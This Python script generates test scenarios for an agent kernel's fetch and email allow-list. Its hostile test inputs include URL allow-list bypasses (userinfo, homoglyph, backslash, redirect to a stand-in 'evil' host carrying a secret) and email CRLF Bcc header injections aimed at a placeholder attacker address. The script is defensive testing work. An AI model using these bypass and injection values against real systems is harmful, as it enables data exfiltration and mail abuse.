#!/usr/bin/env python3
# Copyright (c) 2026 John Koperwas. SPDX-License-Identifier: Apache-2.0
# gen-suite4-allowlist.py — v1.1.1 (091126: the persona is `alex`; names in comments neutral; scenarios otherwise byte-identical) · v1.1.0 (061126: for kernel 0.53.2 — hostile cases expect the kernel's refused NO_TARGET / BAD_INPUT line and no run line, so M15 is visible) · v1.0.1 (061126: email cases run as a SEPARATE identity with email only — v1.0.0 used the fetch identity, whose world actions carry web by design (H1), so every email was refused TAINTED and the address check was never reached) · v1.0.0 (061126) · suite 4: attacks on the ALLOW-LIST ITSELF (second reader, 11:20, Ask 2 #1; aimed at mutations M1, M2).
# Direct calls by an identity granted fetch → news.lab.example and email → alex@lab.example. No model: the allow-list is the only layer
# under test. Hostile: the request must be refused AND nothing may reach the attacker (network / outbox). Benign twins: forms that ARE the
# allowed target (uppercase host, spaced address) must still work — a check that refuses everything is not a pass.
import json, os, time
D = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'suites', 'allowlist')
if os.path.isdir(D):
    os.makedirs(os.path.join(os.path.dirname(D), '_superseded'), exist_ok=True); os.rename(D, os.path.join(os.path.dirname(D), '_superseded', 'allowlist-' + time.strftime('%Y%m%dT%H%M%S')))
os.makedirs(D)
GF = {"actions": {"fetch": {"targets": ["news.lab.example"]}}, "rate": 120}
GM = {"actions": {"email": {"targets": ["alex@lab.example"]}}, "rate": 120}
WEB = {"https://news.lab.example/today": {"text": "allowed page"},
       "https://news.lab.example/r": {"status": 302, "location": "https://evil.lab.example/collect?d=secret"},
       "https://evil.lab.example/collect?d=secret": {"text": "attacker got it"}}
n = 0
def scen(id, twin, about, action, inp, expect):
    global n
    s = {"id": id, "suite": "allowlist", "twin": twin, "about": about, "identities": [{"login": "agent", "grants": GM if action == "email" else GF}], "mailAllow": ["alex@lab.example"],
         "scripts": [], "web": WEB, "steps": [{"as": "agent", "action": action, "input": inp}], "expect": expect}
    json.dump(s, open(os.path.join(D, id + '.json'), 'w'), indent=1); n += 1
NOEVIL = {"network": "evil.lab.example", "count": 0}
FETCH_BAD = [
 ("f-suffix", "allowed name as a PREFIX of the attacker's host", "https://news.lab.example.evil.lab.example/x"),
 ("f-dash", "look-alike with a dash", "https://news-lab.example/x"),
 ("f-userinfo", "allowed name as userinfo before @attacker", "https://news.lab.example@evil.lab.example/x"),
 ("f-trailing-dot", "trailing dot (a different name to an exact check)", "https://news.lab.example./x"),
 ("f-port", "allowed host on another port", "https://news.lab.example:8443/x"),
 ("f-http", "plain http to the allowed host", "http://news.lab.example/x"),
 ("f-idn", "IDN homoglyph (Cyrillic е)", "https://nеws.lab.example/x"),
 ("f-in-path", "allowed name in the PATH of the attacker's URL", "https://evil.lab.example/news.lab.example"),
 ("f-in-query", "allowed name in the QUERY of the attacker's URL", "https://evil.lab.example/?u=news.lab.example"),
 ("f-backslash", "backslash confusion", "https://evil.lab.example\\@news.lab.example/x"),
]
# v1.1.0 (kernel 0.53.2): each hostile case also expects the KERNEL's refusal — code below, written by the bus — and NO run line for the
# action (the action never started). Without these, M15 (the bus check removed) is invisible: layer 2 in fetch.js/email.js still holds.
KCODE = {"f-userinfo": "BAD_INPUT", "e-display": "BAD_INPUT", "e-two": "BAD_INPUT", "e-crlf-to": "BAD_INPUT", "e-crlf-subject": None}   # None = layer 2 (email.js), for F18
def kernel(act, i): c = KCODE.get(i, "NO_TARGET"); return [] if c is None else [{"audit": {"action": act, "outcome": "refused", "code": c}, "count": 1}, {"audit": {"action": act, "outcome": "run"}, "count": 0}]
for i, a, u in FETCH_BAD:
    scen(i, "hostile", "fetch: " + a, "fetch", {"url": u}, kernel("fetch", i) + [{"step": 0, "ok": False}, NOEVIL, {"network": "news-lab", "count": 0}, {"network": ":8443", "count": 0}, {"network": "xn--", "count": 0}, {"network": "http://", "count": 0}])
# redirect: the allowed host answers 302 → attacker. fetch must NOT follow (manual): the step returns the 3xx, nothing reaches the attacker
scen("f-redirect", "hostile", "fetch: the allowed host redirects to the attacker — must not be followed", "fetch", {"url": "https://news.lab.example/r"}, [NOEVIL, {"network": "news.lab.example/r", "count": 1}])
scen("f-upper", "benign", "fetch: the allowed host in UPPERCASE — is the allowed host, must work", "fetch", {"url": "https://NEWS.LAB.EXAMPLE/today"}, [{"step": 0, "ok": True}, NOEVIL])
scen("f-plain", "benign", "fetch: the allowed page itself", "fetch", {"url": "https://news.lab.example/today"}, [{"step": 0, "ok": True}, NOEVIL])
NOATT = {"outbox": {"to": "attacker@evil.lab.example"}, "count": 0}
def mail(to, subject="hello"): return {"to": to, "subject": subject, "text": "a note"}
EMAIL_BAD = [
 ("e-suffix", "allowed address as a prefix of the attacker's domain", mail("alex@lab.example.evil.lab.example")),
 ("e-display", "display-name form with the attacker inside the brackets", mail("alex@lab.example <attacker@evil.lab.example>")),
 ("e-two", "two recipients in one field", mail("alex@lab.example, attacker@evil.lab.example")),
 ("e-crlf-to", "CRLF + Bcc header in the address", mail("alex@lab.example\r\nBcc: attacker@evil.lab.example")),
 ("e-crlf-subject", "CRLF + Bcc header in the subject", mail("alex@lab.example", "hi\r\nBcc: attacker@evil.lab.example")),
 ("e-plus", "plus-addressing variant of the allowed address", mail("alex+x@lab.example")),
]
for i, a, inp in EMAIL_BAD:
    scen(i, "hostile", "email: " + a, "email", inp, kernel("email", i) + [{"step": 0, "ok": False}, NOATT, {"outbox": {}, "count": 0}])
scen("e-upper", "benign", "email: the allowed address in UPPERCASE — must work", "email", mail("ALEX@LAB.EXAMPLE"), [{"step": 0, "ok": True}, {"outbox": {"to": "alex@lab.example"}, "count": 1}])
scen("e-spaces", "benign", "email: the allowed address with spaces around it — must work", "email", mail("  alex@lab.example "), [{"step": 0, "ok": True}, {"outbox": {"to": "alex@lab.example"}, "count": 1}])
print('wrote', n, 'scenarios to', D)
